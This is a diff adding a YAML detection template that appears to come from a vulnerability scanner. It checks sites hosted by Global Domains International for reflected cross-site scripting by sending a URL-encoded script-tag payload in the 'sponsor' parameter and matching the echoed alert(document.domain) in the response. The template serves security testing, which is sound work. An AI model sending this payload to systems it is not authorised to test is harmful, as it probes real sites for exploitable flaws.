@@ -1,0 +1,25 @@
+id: global-domains-xss
+name: Global Domains International - Cross-Site Scripting
+severity: high
+confidence: tentative
+description: Sites hosted by Global Domains International, Inc. have cross-site scripting and directory traversal vulnerabilities.
+reference: CWE-79
+tags:
+- globaldomains
+- xss
+- packetstorm
+- vuln
+requests:
+- method: GET
+  path: /index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+  matchers:
+  - type: body
+    words:
+    - </script><script>alert(document.domain)</script>
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
